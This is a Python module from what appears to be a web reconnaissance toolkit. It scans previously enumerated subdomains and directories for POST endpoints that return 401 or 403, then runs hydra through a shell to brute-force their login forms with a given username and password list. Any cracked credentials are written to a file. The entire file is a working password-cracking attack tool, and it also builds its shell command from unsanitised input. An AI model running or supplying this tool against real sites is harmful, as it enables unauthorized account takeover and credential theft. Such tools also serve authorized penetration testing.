"""
This module contains the functions that are used to crack the passwords of the
websites that require authentication
It can also be run as a standalone file for the domains listed in output_files/ dir
"""

import argparse
import sys
import requests
import subprocess
from tqdm import tqdm
from multiprocessing import cpu_count
from concurrent.futures import ThreadPoolExecutor
from threading import Lock


def argumentParser():
	"""
	Parses the arguments given to the script
	Returns:
		arguments (argparse.Namespace): Namespace object containing the arguments
	"""

	threads = cpu_count() - 2 if cpu_count() > 4 else 1
	parser = argparse.ArgumentParser(
		description="Simple script to crack the passwords of websites that require authentication",
		formatter_class=argparse.RawTextHelpFormatter
	)

	# Required argument: domain
	parser.add_argument("-u", "--username", help="Username to be used for the attack\n\n", required=True)

	# Required argument: password_file
	parser.add_argument("-p", "--password_file", help="Path to the file containing the passwords\n\n", required=True)

	# Optional argument: threads
	parser.add_argument("-t", "--threads", help=f"Number of threads to be used for the attack (default: {threads})\n\n",
	                    default=threads, type=int)

	return parser.parse_args()


def bruteForce(post_dirs, username, password_file):
	"""
	Uses the hydra tool to brute force the login page of the provided url
	Args:
		 post_dirs (list): list of urls that require authentication
		 username (str): username to be used for the attack
		 password_file (str): path to the file containing the passwords
	Returns:
		 None
	"""

	for url in post_dirs:
		hydra_command = f"hydra -l {username} -P {password_file} {url} http-post-form " \
		                f"'/:username=^USER^&password=^PASS^:F=incorrect'"
		output = subprocess.check_output(hydra_command, shell=True)
		if b"password found" in output:
			with open("output_files/passwords.bat", "a") as f:
				f.write(f"{url} - {output.split(b':')[1].decode('utf-8')}")


def checkHydra():
	"""
	Checks if hydra is installed on the system
	Returns:
		True if hydra is installed, False otherwise
	"""

	try:
		subprocess.check_output(["which", "hydra"])
		return True
	except subprocess.CalledProcessError:
		return False


def loadDomainsFromFile():
	"""
	Loads the valid subdomains and directories from their respective files
	Returns:
		valid_subdomains (list): list of valid subdomains
		valid_dirs (list): list of valid directories
	"""

	with open("output_files/valid_subdomains.bat", "r") as f:
		valid_subdomains = f.read().splitlines()

	with open("output_files/valid_dirs.bat", "r") as f:
		valid_dirs = f.read().splitlines()

	return valid_subdomains, valid_dirs


def checkPostDirs(valid_dirs, valid_subdomains, pbar, lock):
	"""
	Checks which domains in the given lists support POST methods and which ones require authentication
	Args:
		pbar (tqdm.tqdm): tqdm progress bar object
		lock (threading.Lock): lock object to synchronize the threads
		valid_dirs (list): list of valid directories
		valid_subdomains (list): list of valid subdomains

	Returns:
		post_dirs (list): list of urls that support POST methods and require authentication
	"""

	# Initialize a list to store the urls that support POST methods and require authentication and add together the
	# valid directories and subdomains
	post_dirs = []
	valid_urls = valid_dirs + valid_subdomains

	for domain in valid_urls:
		with lock:
			pbar.update(1)
		try:
			post_request = requests.post(domain)
		except requests.exceptions.ConnectionError:
			continue
		if post_request.status_code in [401, 403]:
			post_dirs.append(domain)

	return post_dirs


def main():
	args = argumentParser()

	if not checkHydra():
		print("Hydra not found on system, cannot proceed with brute force")
		sys.exit(1)

	valid_subdomains, valid_dirs = loadDomainsFromFile()

	# Divide the lists into chunks for the workers
	max_workers = args.threads
	divided_dirs = [valid_dirs[i::max_workers] for i in range(max_workers)]
	divided_subdomains = [valid_subdomains[i::max_workers] for i in range(max_workers)]

	# Create the workers
	total_iterations = len(valid_dirs) + len(valid_subdomains)
	workers = []

	# Pass the divided lists to the workers
	with tqdm(total=total_iterations, desc="Checking URLs for POST support", unit="URLs", dynamic_ncols=True) as pbar, \
			ThreadPoolExecutor(max_workers=max_workers) as executor:
		lock = Lock()
		for i in range(max_workers):
			workers.append(executor.submit(checkPostDirs, divided_dirs[i], divided_subdomains[i], pbar, lock))

	# Merge the results from the workers
	post_dirs = []
	for worker in workers:
		post_dirs.extend(worker.result())
	if len(post_dirs) == 0:
		print("No POST endpoint found that require authentication")
	else:
		print(f"Found {len(post_dirs)} POST directories that require authentication")

	input_file = args.username
	password_file = args.password_file
	bruteForce(post_dirs, input_file, password_file)


if __name__ == "__main__":
	main()
